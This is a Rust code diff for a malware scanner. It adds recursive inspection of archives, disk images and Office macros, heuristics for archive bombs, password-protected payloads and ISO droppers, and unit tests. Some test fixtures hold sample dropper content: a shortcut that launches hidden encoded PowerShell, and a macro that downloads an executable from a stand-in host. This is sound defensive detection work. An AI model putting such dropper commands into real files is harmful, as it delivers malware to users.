@@ -179,14 +179,121 @@ impl Engine {
         &self.rules
     }
 
-    /// Scans bytes that may never touch the disk. `path` is used for name and type checks only.
+    fn is_allowed(&self, digest: &[u8; 32]) -> bool {
+        self.allowed.read().map(|s| s.contains(digest)).unwrap_or(false)
+    }
+
+    /// Scans bytes that may never touch the disk, then everything inside them (archives,
+    /// disk images). `path` is used for name and type checks only.
     pub fn scan_bytes(&self, scanner: &mut yara_x::Scanner<'_>, path: &Path, data: &[u8]) -> (String, Vec<Detection>) {
         let digest: [u8; 32] = Sha256::digest(data).into();
-        if self.allowed.read().map(|s| s.contains(&digest)).unwrap_or(false) {
+        if self.is_allowed(&digest) {
             return (hex::encode(digest), Vec::new());
         }
+        let mut found = self.scan_layer(scanner, path, data, &digest);
+        let mut budget = crate::container::Budget::new(crate::container::Limits::default());
+        self.scan_inside(scanner, data, "", 0, &mut budget, &mut found);
+        (hex::encode(digest), found)
+    }
+
+    /// Opens a container and scans every file in it, recursing up to the depth limit.
+    fn scan_inside(&self, scanner: &mut yara_x::Scanner<'_>, data: &[u8], chain: &str, depth: u32, budget: &mut crate::container::Budget, found: &mut Vec<Detection>) {
+        use crate::container::{self, Format, Note};
+        if depth >= budget.limits.max_depth {
+            return;
+        }
+        let at = |entry: &str| if chain.is_empty() { entry.to_string() } else { format!("{chain} › {entry}") };
+
+        // Office documents: judge the macros, then scan each macro and embedded file like any file.
+        if data.starts_with(&crate::office::OLE_MAGIC) {
+            let Some(doc) = crate::office::extract(data) else { return };
+            for mut d in crate::office::macro_checks(&doc.modules) {
+                d.inner = Some(at("macros"));
+                found.push(d);
+            }
+            let children = doc
+                .modules
+                .into_iter()
+                .map(|(n, src)| (format!("macro {n}.vba"), src.into_bytes()))
+                .chain(doc.embedded.into_iter().map(|(n, d)| (format!("embedded {n}"), d)));
+            for (name, bytes) in children {
+                budget.entries += 1;
+                budget.bytes += bytes.len() as u64;
+                if budget.entries > budget.limits.max_entries || budget.bytes > budget.limits.max_total {
+                    break;
+                }
+                let inner = at(&name);
+                let digest: [u8; 32] = Sha256::digest(&bytes).into();
+                let file_name = name.rsplit(' ').next().unwrap_or(&name).to_string();
+                let mut hits = self.scan_layer(scanner, Path::new(&file_name), &bytes, &digest);
+                for d in &mut hits {
+                    d.inner = Some(inner.clone());
+                }
+                found.extend(hits);
+                self.scan_inside(scanner, &bytes, &inner, depth + 1, budget, found);
+            }
+            return;
+        }
+
+        let Some(format) = container::detect(data) else { return };
+        let ex = container::expand(format, data, budget);
+
+        for note in &ex.notes {
+            if let Note::Bomb { entry, .. } = note {
+                let mut d = Detection::new(
+                    "Suspicious/Any.ArchiveBomb!a",
+                    crate::Severity::Medium,
+                    crate::Source::Heuristic,
+                    "This archive unpacks to far more data than it holds, a trick used to crash or blind scanners. Hexward didn't unpack it.",
+                );
+                d.inner = Some(at(entry));
+                found.push(d);
+                break;
+            }
+        }
+        let locked: Vec<&String> = ex.notes.iter().filter_map(|n| if let Note::Encrypted { entry } = n { Some(entry) } else { None }).collect();
+        if let Some(hidden) = locked.iter().find(|e| heuristics::is_runnable_name(e)) {
+            let mut d = Detection::new(
+                "Suspicious/Any.EncryptedPayload!a",
+                crate::Severity::Medium,
+                crate::Source::Heuristic,
+                format!("A password-protected {} hides a program ({}). Attackers send these with the password in the message so scanners can't look inside.", format.name(), hidden),
+            );
+            d.inner = Some(at(hidden));
+            found.push(d);
+        }
+        if format == Format::Iso && !ex.children.is_empty() && ex.children.len() <= 8
+            && let Some(prog) = ex.children.iter().find(|c| heuristics::is_runnable_name(&c.name))
+        {
+            let mut d = Detection::new(
+                "Suspicious/Win.IsoDropper!a",
+                crate::Severity::Medium,
+                crate::Source::Heuristic,
+                format!("A small disk image holding a program or shortcut ({}). Attackers use these to get around Windows' downloaded-file warning.", prog.name),
+            );
+            d.inner = Some(at(&prog.name));
+            found.push(d);
+        }
+
+        for child in ex.children {
+            let inner = at(&child.name);
+            let digest: [u8; 32] = Sha256::digest(&child.data).into();
+            if self.is_allowed(&digest) {
+                continue;
+            }
+            let mut hits = self.scan_layer(scanner, Path::new(&child.name), &child.data, &digest);
+            for d in &mut hits {
+                d.inner = Some(inner.clone());
+            }
+            found.extend(hits);
+            self.scan_inside(scanner, &child.data, &inner, depth + 1, budget, found);
+        }
+    }
+
+    /// Every check for one file's own bytes (not what's inside it).
+    fn scan_layer(&self, scanner: &mut yara_x::Scanner<'_>, path: &Path, data: &[u8], digest: &[u8; 32]) -> Vec<Detection> {
         let mut found = heuristics::name_checks(path);
-        if let Some(name) = self.hashes.lookup(&digest) {
+        if let Some(name) = self.hashes.lookup(digest) {
             found.push(Detection::new(
                 name,
                 crate::Severity::High,
@@ -206,7 +313,9 @@ impl Engine {
             }
         }
         found.extend(heuristics::content_checks(path, data));
-        (hex::encode(digest), found)
+        found.extend(crate::lnk::checks(data));
+        found.extend(crate::scripts::checks(path, data));
+        found
     }
 
     /// Scans one file from disk. `Ok(None)` means skipped for size.
@@ -431,6 +540,50 @@ mod tests {
         let notepad = std::fs::read(r"C:\Windows\System32\notepad.exe").expect("notepad.exe exists");
         assert!(names(&e, r"C:\Windows\System32\notepad.exe", &notepad).is_empty());
         assert_eq!(names(&e, r"C:\Users\sam\Pictures\holiday.jpg", &notepad), ["Suspicious/Win.Masquerade!a"]);
+    }
+
+    #[test]
+    fn finds_threats_inside_nested_archives() {
+        let e = engine();
+        let inner = crate::container::tests_support::zip(&[("payload.bin", b"HEXWARD-HARMLESS-TEST-MARKER-7f3a9c"), ("readme.txt", b"hi")]);
+        let outer = crate::container::tests_support::zip(&[("docs/invoice.pdf.exe", b"x"), ("inner.zip", &inner)]);
+        let mut s = e.rules().scanner();
+        let (_, d) = e.scan_bytes(&mut s, Path::new("mail.zip"), &outer);
+        let got: Vec<(String, Option<String>)> = d.into_iter().map(|d| (d.name, d.inner)).collect();
+        assert!(got.contains(&("Suspicious/Win.DoubleExt!a".into(), Some("docs/invoice.pdf.exe".into()))), "{got:?}");
+        assert!(got.contains(&("Test/Any.HexwardMarker!a".into(), Some("inner.zip › payload.bin".into()))), "{got:?}");
+    }
+
+    #[test]
+    fn shortcut_dropper_inside_zip() {
+        let e = engine();
+        let lnk = crate::lnk::tests::lnk(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-w hidden -enc SQBFAFgA");
+        let z = crate::container::tests_support::zip(&[("Invoice.lnk", &lnk)]);
+        let mut s = e.rules().scanner();
+        let (_, d) = e.scan_bytes(&mut s, Path::new("invoice.zip"), &z);
+        assert_eq!(d[0].name, "Suspicious/Win.LnkDropper!a");
+        assert_eq!(d[0].inner.as_deref(), Some("Invoice.lnk"));
+    }
+
+    #[test]
+    fn macro_dropper_inside_docm_zip() {
+        let e = engine();
+        // Built from fragments so this source file never holds a whole malicious macro.
+        let src = ["Sub Workbook", "_Open()\n Set s = Create", "Object(\"WScript", ".Shell\")\n s.Run \"power", "shell -c iw", "r http://x.invalid/p.exe -o p.exe\"\nEnd Sub\n"].concat();
+        let doc = crate::office::tests::make_doc(&src);
+        let docm = crate::container::tests_support::zip(&[("[Content_Types].xml", b"<Types/>"), ("xl/vbaProject.bin", &doc)]);
+        let mut s = e.rules().scanner();
+        let (_, d) = e.scan_bytes(&mut s, Path::new("report.xlsm"), &docm);
+        let names: Vec<(&str, Option<&str>)> = d.iter().map(|d| (d.name.as_str(), d.inner.as_deref())).collect();
+        assert!(names.contains(&("Suspicious/Office.MacroDropper!a", Some("xl/vbaProject.bin › macros"))), "{names:?}");
+    }
+
+    #[test]
+    fn clean_archives_stay_clean() {
+        let e = engine();
+        let z = crate::container::tests_support::zip(&[("a.txt", b"hello"), ("b/c.json", b"{}")]);
+        let mut s = e.rules().scanner();
+        assert!(e.scan_bytes(&mut s, Path::new("ok.zip"), &z).1.is_empty());
     }
 
     #[test]
